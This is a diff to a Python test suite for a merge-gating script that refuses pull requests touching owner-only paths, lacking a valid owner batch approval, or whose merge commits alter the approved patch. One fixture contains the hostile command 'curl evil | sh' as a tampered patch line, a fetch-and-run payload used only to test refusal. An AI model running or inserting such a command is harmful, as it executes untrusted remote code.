@@ -99,9 +99,9 @@ def make_api(files=None, title="Update the plan", body="Refreshes section 4. See
     )
 
 
-def go(api, sha=SHA, kind="working-draft-docs", resolver=None):
+def go(api, sha=SHA, kind="working-draft-docs", resolver=None, flags=(), **kwargs):
     out, err = io.StringIO(), io.StringIO()
-    code = merge_ready.main([str(N), sha, kind], api=api, out=out, err=err, resolver=resolver or fake_resolver())
+    code = merge_ready.main([*flags, str(N), sha, kind], api=api, out=out, err=err, resolver=resolver or fake_resolver(), **kwargs)
     return code, out.getvalue() + err.getvalue()
 
 
@@ -440,8 +440,8 @@ class UsageTests(unittest.TestCase):
         self.assertEqual(api.requested, [])
         self.assertEqual(api.merged, [])
 
-    def test_kinds_are_exactly_the_three_authorized_ones(self):
-        self.assertEqual(sorted(merge_ready.KINDS), ["dependabot", "tasks-sync", "working-draft-docs"])
+    def test_kinds_are_exactly_the_authorized_ones(self):
+        self.assertEqual(sorted(merge_ready.KINDS), ["dependabot", "general", "owner-batch", "tasks-sync", "working-draft-docs"])
 
     def test_cli_unknown_kind(self):
         res = self.cli("12", SHA, "everything")
@@ -449,7 +449,10 @@ class UsageTests(unittest.TestCase):
         self.assertIn("unknown kind", res.stderr + res.stdout)
 
     def test_cli_bad_arguments(self):
-        for args in (("x", SHA, "dependabot"), ("12", "abc", "dependabot"), ("12", SHA), ("12", SHA, "dependabot", "extra"), ()):
+        for args in (("x", SHA, "dependabot"), ("12", "abc", "dependabot"), ("12", SHA), ("12", SHA, "dependabot", "extra"), (),
+                     ("--approval", "12", SHA, "owner-batch"), ("--approval", "x", "12", SHA, "owner-batch"),  # no value, or not a comment id
+                     ("--approval", "5", "12", SHA, "general"),  # an approval belongs to owner-batch only
+                     ("--wait", "--wait", "12", SHA, "general", "extra"), ("--bogus", "12", SHA, "general")):
             with self.subTest(args=args):
                 res = self.cli(*args)
                 self.assertNotEqual(res.returncode, 0)
@@ -474,6 +477,278 @@ class UsageTests(unittest.TestCase):
         code, text = go(api)
         self.assertNotEqual(code, 0)
         self.assertIn("405", text)
+
+
+class GeneralKindTests(unittest.TestCase):
+    """Kind `general`: a PR that is not owner-only, merged under the owner's standing authorization (#15 comment 7005366747)."""
+
+    def refused(self, api, reason, **kwargs):
+        code, text = go(api, kind="general", **kwargs)
+        self.assertNotEqual(code, 0, text)
+        self.assertEqual(api.merged, [], "a refused PR must not be merged")
+        self.assertRegex(text, reason)
+
+    def test_non_gate_scripts_docs_and_build_files_are_merged(self):
+        names = ("scripts/verify.sh", "scripts/new_tool.py", "scripts/test_new_tool.py", "app/build.gradle.kts", "README.md", "docs/FOLLOW-UPS.md",
+                 "core/domain/src/Lists.kt", "docs/product/flow.md", "docs/milestones/M1.md", "firebase/test/rules.test.ts")
+        api = make_api(files=[file_entry(n) for n in names])
+        self.assertEqual(go(api, kind="general")[0], 0)
+        self.assertEqual([m[1]["sha"] for m in api.merged], [SHA])
+
+    def test_every_owner_only_path_is_refused(self):
+        names = ("CLAUDE.md", "REVIEW.md", "agents/roles.yaml", "agents/prompts/orchestrator.md", ".claude/settings.json", ".github/workflows/ci.yml",
+                 ".github/CODEOWNERS", ".githooks/pre-commit", "scripts/guards.sh", "scripts/hooks/pretooluse_guard.py", "scripts/mark-ready.sh",
+                 "scripts/merge_ready.py", "scripts/test_merge_ready.py", "docs/ORCHESTRATION.md", "docs/BRANCH-PROTECTION.md",
+                 "docs/product/naming.md", "docs/reviews/README.md", "docs/reviews/new.md", "design/new-sign-off.md",
+                 "firebase/package.json", "firebase/package-lock.json", "gradle/libs.versions.toml", "scripts/requirements-lint.txt",
+                 "gradle/wrapper/gradle-wrapper.properties", "gradle/verification-metadata.xml")
+        for name in names:
+            with self.subTest(name=name):
+                self.refused(make_api(files=[file_entry("scripts/new_tool.py"), file_entry(name)]), r"outside kind general.*" + re.escape(name))
+
+    def test_dotdot_and_a_rename_from_an_owner_only_path_are_refused(self):
+        for entry, reason in ((file_entry("scripts/../CLAUDE.md"), r"\.\."),
+                              (file_entry("scripts/x.py", status="renamed", previous="scripts/guards.sh"), r"scripts/guards\.sh")):
+            with self.subTest(reason=reason):
+                self.refused(make_api(files=[entry]), reason)
+
+    def test_a_working_draft_sign_off_or_removal_is_still_the_owners(self):
+        flip = "@@ -3 +3 @@\n-Status: working draft; not owner-approved (see issue #15).\n+Status: approved by the owner."
+        for f in (file_entry("docs/product/stories.md", patch=flip), {"filename": "docs/PLAN.md", "status": "removed"},
+                  {"filename": "docs/milestones/M1.md", "status": "renamed", "previous_filename": "docs/milestones/old.md"}):
+            with self.subTest(f=f):
+                self.refused(make_api(files=[f]), r"(not owner-approved|sign-off|removal)")
+
+    def test_the_common_checks_still_apply(self):
+        self.refused(make_api(files=[file_entry("scripts/x.py")], state="behind"), r"mergeable_state.*behind")
+        self.refused(make_api(files=[file_entry("scripts/x.py")], body="Fixes #1"), r"closing keyword")
+        self.refused(make_api(files=[file_entry("scripts/x.py")], checks=[run("guards"), run("tasks")]), r"static.*missing")
+
+
+C1, M1, M2 = "1" * 40, "2" * 40, SHA  # the approved commit, a first update-branch merge, and the head (a second one)
+BASE0, MAIN1, MAIN2 = "4" * 40, "5" * 40, "6" * 40
+CID = 7007999999
+CHANGED = [{"filename": "CLAUDE.md", "status": "modified", "sha": "f" * 40, "patch": "@@ -1 +1 @@\n-old\n+new"}]
+
+
+def commit(sha, parents, message="Edit"):
+    return {"sha": sha, "parents": [{"sha": p} for p in parents], "commit": {"message": message}}
+
+
+def approval_comment(listed, login="bondo", assoc="OWNER", issue=15, edited=False, line="batch approval: "):
+    return {"user": {"login": login}, "author_association": assoc, "issue_url": f"https://api.github.com/repos/{REPO}/issues/{issue}",
+            "body": f"decision (owner): {line}{listed}\nThanks.", "created_at": "2026-11-19T12:00:00Z",
+            "updated_at": "2026-11-19T12:05:00Z" if edited else "2026-11-19T12:00:00Z"}
+
+
+def compare(files=None, status="ahead"):
+    return {"status": status, "files": copy.deepcopy(CHANGED if files is None else files)}
+
+
+def batch_api(listed=None, commits=None, head_compare=None, approved_compare=None, parent_status="behind", comment=None, earlier=None):
+    """A PR whose head is M2 (two update-branch merges after the approved commit C1) and a batch approval comment for it."""
+    commits = commits if commits is not None else [commit(C1, [BASE0]), commit(M1, [C1, MAIN1], "Merge branch 'main' into x"),
+                                                    commit(M2, [M1, MAIN2], "Merge branch 'main' into x")]
+    api = make_api(files=[file_entry("CLAUDE.md")], commits=commits)
+    api.data[f"repos/{REPO}/compare/main...{M2}"] = head_compare or compare()
+    api.data[f"repos/{REPO}/compare/main...{C1}"] = approved_compare or compare()
+    for main_sha in (MAIN1, MAIN2):
+        api.data[f"repos/{REPO}/compare/main...{main_sha}"] = {"status": parent_status, "files": []}
+    api.data[f"repos/{REPO}/issues/comments/{CID}"] = comment or approval_comment(listed if listed is not None else f"#{N}@{C1[:7]}")
+    for num, merged in (earlier or {}).items():
+        api.data[f"repos/{REPO}/pulls/{num}"] = {"merged": merged, "state": "closed" if merged else "open"}
+    return api
+
+
+def go_batch(api, sha=M2, flags=("--approval", str(CID)), **kwargs):
+    return go(api, sha=sha, kind="owner-batch", flags=flags, **kwargs)
+
+
+class OwnerBatchTests(unittest.TestCase):
+    """Kind `owner-batch` (owner decision D1/D2, #15 comment 7007421567): any paths, but only a PR the owner's batch approval lists with a
+    head SHA, and only at that head or at a head that adds update-branch merges of main with the same patch against main."""
+
+    def refused(self, api, reason, sha=M2, flags=("--approval", str(CID))):
+        code, text = go(api, sha=sha, kind="owner-batch", flags=flags)
+        self.assertNotEqual(code, 0, text)
+        self.assertEqual(api.merged, [], "a refused PR must not be merged")
+        self.assertRegex(text, reason)
+
+    def merged(self, api, sha=M2, **kwargs):
+        code, text = go_batch(api, sha=sha, **kwargs)
+        self.assertEqual(code, 0, text)
+        self.assertEqual(len(api.merged), 1)
+        self.assertEqual(api.merged[0][1]["sha"], sha)
+        self.assertEqual(api.merged[0][1]["merge_method"], "squash")
+
+    def test_head_equal_to_the_approved_sha_is_merged_with_any_paths(self):
+        api = make_api(files=[file_entry("CLAUDE.md"), file_entry(".claude/settings.json")], commits=[commit(SHA, [BASE0])])
+        api.data[f"repos/{REPO}/issues/comments/{CID}"] = approval_comment(f"#{N}@{SHA[:7]}")
+        self.merged(api, sha=SHA)
+
+    def test_head_after_update_branch_merges_with_the_same_patch_is_merged(self):
+        self.merged(batch_api())
+
+    def test_the_pr_may_sit_anywhere_in_the_list_when_the_earlier_prs_are_merged(self):
+        self.merged(batch_api(listed=f"#70@{'7' * 7}, #71@{'8' * 7}, #{N}@{C1[:7]}, #90@{'9' * 7}", earlier={70: True, 71: True}))
+
+    def test_context_and_line_number_shifts_from_main_do_not_change_the_patch(self):
+        moved = compare([{"filename": "CLAUDE.md", "status": "modified", "sha": "e" * 40,
+                          "patch": "@@ -40,3 +44,3 @@ other context\n context line from main\n-old\n+new\n more context"}])
+        self.merged(batch_api(head_compare=moved))
+
+    def test_no_approval_flag_is_a_usage_error_before_any_api_call(self):
+        api = batch_api()
+        self.assertEqual(go(api, sha=M2, kind="owner-batch")[0], 2)
+        self.assertEqual((api.requested, api.merged), ([], []))
+
+    def test_wrong_sha_in_the_approval(self):
+        self.refused(batch_api(listed=f"#{N}@{'9' * 7}"), r"approved sha 9{7}.*(not|none)")
+
+    def test_pr_missing_from_the_batch(self):
+        self.refused(batch_api(listed=f"#70@{C1[:7]}, #71@{C1[:7]}"), rf"PR {N} is not in the batch approval")
+
+    def test_a_pr_listed_twice_is_ambiguous(self):
+        self.refused(batch_api(listed=f"#{N}@{C1[:7]}, #{N}@{M1[:7]}"), r"(twice|duplicate)")
+
+    def test_a_comment_without_a_batch_approval_line(self):
+        self.refused(batch_api(comment=approval_comment(f"#{N}@{C1[:7]}", line="I think we could merge ")), r"batch approval")
+
+    def test_comment_not_by_the_owner_or_not_on_the_state_issue_or_edited(self):
+        cases = {"login": approval_comment(f"#{N}@{C1[:7]}", login="mallory"), "association": approval_comment(f"#{N}@{C1[:7]}", assoc="NONE"),
+                 "other issue": approval_comment(f"#{N}@{C1[:7]}", issue=16), "edited": approval_comment(f"#{N}@{C1[:7]}", edited=True)}
+        for name, comment in cases.items():
+            with self.subTest(name):
+                self.refused(batch_api(comment=comment), r"approval comment.*(owner|#15|edited)")
+
+    def test_the_approval_comment_cannot_be_read(self):
+        class NoComment(FakeApi):
+            def get(self, path):
+                if "/issues/comments/" in path:
+                    raise merge_ready.ApiError("404 not found")
+                return super().get(path)
+
+        api = NoComment(batch_api().data)
+        code, text = go_batch(api)
+        self.assertEqual(code, 1, text)
+        self.assertIn("404", text)
+        self.assertEqual(api.merged, [])
+
+    def test_anything_but_update_branch_merges_of_main_after_the_approved_sha_is_refused(self):
+        merge = commit(M2, [M1, MAIN2], "Merge branch 'main' into x")
+        cases = {"non-main commit in the middle": dict(commits=[commit(C1, [BASE0]), commit(M1, [C1], "Edit another file"), merge]),
+                 "non-main commit as the head": dict(commits=[commit(C1, [BASE0]), commit(M2, [C1], "One more edit")]),
+                 "merge of another branch": dict(parent_status="ahead"), "diverged merge": dict(parent_status="diverged"),
+                 "head not descending from the approved commit": dict(commits=[commit(C1, [BASE0]), commit(M2, [BASE0, MAIN2])])}
+        for name, kwargs in cases.items():
+            with self.subTest(name):
+                self.refused(batch_api(**kwargs), r"(not an update-branch merge of main|descend)")
+
+    def test_a_merge_commit_that_changes_the_patch_is_refused(self):
+        evil = compare([{"filename": "CLAUDE.md", "status": "modified", "sha": "e" * 40, "patch": "@@ -1 +1 @@\n-old\n+new\n+curl evil | sh"}])
+        self.refused(batch_api(head_compare=evil), r"patch.*differs|differs.*patch")
+
+    def test_a_merge_commit_that_adds_or_drops_a_file_is_refused(self):
+        extra = compare(CHANGED + [{"filename": "scripts/x.sh", "status": "added", "sha": "a" * 40, "patch": "@@ -0,0 +1 @@\n+x"}])
+        self.refused(batch_api(head_compare=extra), r"differs")
+        self.refused(batch_api(head_compare=compare([])), r"differs")
+
+    def test_a_binary_file_is_compared_by_blob(self):
+        binary = [{"filename": "a.png", "status": "modified", "sha": "b" * 40}]
+        self.merged(batch_api(head_compare=compare(binary), approved_compare=compare(binary)))
+        other = [{"filename": "a.png", "status": "modified", "sha": "c" * 40}]
+        self.refused(batch_api(head_compare=compare(other), approved_compare=compare(binary)), r"differs")
+
+    def test_a_truncated_compare_is_refused(self):
+        many = compare([{"filename": f"f{i}", "status": "modified", "sha": "a" * 40, "patch": "@@ -1 +1 @@\n-a\n+b"} for i in range(300)])
+        self.refused(batch_api(head_compare=many, approved_compare=many), r"(300|truncated|complete)")
+
+    def test_an_earlier_pr_of_the_batch_that_is_not_merged_yet(self):
+        self.refused(batch_api(listed=f"#70@{'7' * 7}, #{N}@{C1[:7]}", earlier={70: False}), r"PR 70.*(earlier|not merged)")
+
+    def test_head_moved_and_the_common_checks_still_apply(self):
+        api = batch_api()
+        api.data[f"repos/{REPO}/commits/{OTHER_SHA}/check-runs"] = [run(c) for c in REQUIRED]
+        self.refused(api, r"head .*not", sha=OTHER_SHA)
+        api = batch_api()
+        api.data[f"repos/{REPO}/pulls/{N}"]["mergeable_state"] = "behind"
+        self.refused(api, r"mergeable_state.*behind")
+        api = batch_api()
+        api.data[f"repos/{REPO}/pulls/{N}"]["body"] = "closes #12"
+        self.refused(api, r"closing keyword")
+
+
+class FakeWait:
+    """A fake clock and sleep. After `settle` sleeps the PR is clean and its last check finished (red if `fail`)."""
+
+    def __init__(self, api, settle=None, fail=False):
+        self.api, self.settle, self.fail, self.now, self.sleeps = api, settle, fail, 0.0, []
+
+    def sleep(self, seconds):
+        self.sleeps.append(seconds)
+        self.now += seconds
+        if len(self.sleeps) == self.settle:
+            self.api.data[f"repos/{REPO}/pulls/{N}"]["mergeable_state"] = "blocked" if self.fail else "clean"
+            last = run("static", conclusion="failure" if self.fail else "success")
+            self.api.data[f"repos/{REPO}/commits/{SHA}/check-runs"] = [run("guards"), run("tasks"), last]
+
+    def clock(self):
+        return self.now
+
+
+def pending_api(state="blocked"):
+    return make_api(state=state, checks=[run("guards"), run("tasks"), run("static", status="in_progress", conclusion=None)])
+
+
+class WaitTests(unittest.TestCase):
+    """`--wait`: poll while required checks are pending (or not reported yet); everything else still refuses at once."""
+
+    def go(self, api, wait, kind="working-draft-docs", **kwargs):
+        return go(api, kind=kind, flags=("--wait",), sleep=wait.sleep, clock=wait.clock, **kwargs)
+
+    def test_waits_for_pending_checks_then_merges_with_the_same_pin(self):
+        api = pending_api()
+        wait = FakeWait(api, settle=3)
+        self.assertEqual(self.go(api, wait)[0], 0)
+        self.assertEqual(len(wait.sleeps), 3)
+        self.assertEqual([m[1]["sha"] for m in api.merged], [SHA])
+
+    def test_a_check_that_is_not_reported_yet_counts_as_pending(self):
+        api = make_api(state="blocked", checks=[run("guards"), run("tasks")])
+        self.assertEqual(self.go(api, FakeWait(api, settle=1))[0], 0)
+
+    def test_pending_forever_times_out_without_merging(self):
+        api = pending_api()
+        wait = FakeWait(api)
+        code, text = self.go(api, wait)
+        self.assertEqual(code, 1, text)
+        self.assertEqual(api.merged, [])
+        self.assertRegex(text, r"static.*pending(.|\n)*timed out")
+        self.assertTrue(merge_ready.WAIT_SECONDS <= wait.now <= merge_ready.WAIT_SECONDS + merge_ready.WAIT_POLL)
+
+    def test_a_check_that_goes_red_while_waiting_refuses_and_stops_waiting(self):
+        api = pending_api()
+        wait = FakeWait(api, settle=2, fail=True)
+        code, text = self.go(api, wait)
+        self.assertEqual(code, 1, text)
+        self.assertEqual(len(wait.sleeps), 2)
+        self.assertRegex(text, r"static.*failure")
+        self.assertEqual(api.merged, [])
+
+    def test_other_problems_refuse_at_once_even_when_a_check_is_pending(self):
+        queued = run("static", status="queued", conclusion=None)
+        cases = {"behind": dict(state="behind"), "head moved": dict(sha=OTHER_SHA), "closing keyword": dict(body="fixes #12"),
+                 "path": dict(files=[file_entry("CLAUDE.md")]), "base": dict(base="release"),
+                 "red check": dict(checks=[run("guards"), run("tasks", conclusion="failure"), queued])}
+        for name, kwargs in cases.items():
+            with self.subTest(name):
+                api = make_api(**{"state": "blocked", "checks": [run("guards"), run("tasks"), queued], **kwargs})
+                wait = FakeWait(api)
+                code, _ = self.go(api, wait)
+                self.assertEqual(code, 1)
+                self.assertEqual(wait.sleeps, [], "no waiting while something else is wrong")
+                self.assertEqual(api.merged, [])
+
 
 
 class WiringTests(unittest.TestCase):
@@ -508,6 +783,13 @@ class WiringTests(unittest.TestCase):
         doc = self.read("docs/ORCHESTRATION.md")
         self.assertRegex(doc, r"(?is)merge agent.*git ls-remote.*annotated tags dereferenced")
         self.assertRegex(doc, r"(?i)7-day `cooldown`")
+
+    def test_docs_name_every_kind_and_flag_of_the_script(self):
+        doc = self.read("docs/ORCHESTRATION.md")
+        for word in sorted(merge_ready.KINDS) + ["--wait", "--approval <comment-id>", "batch approval", "standing authorization"]:
+            with self.subTest(word=word):
+                self.assertIn(word, doc)
+
 
     def test_wiring_helper_ignores_commented_lines(self):
         self.assertEqual(self.active("# step x\n  run: y\n"), ["run: y"])
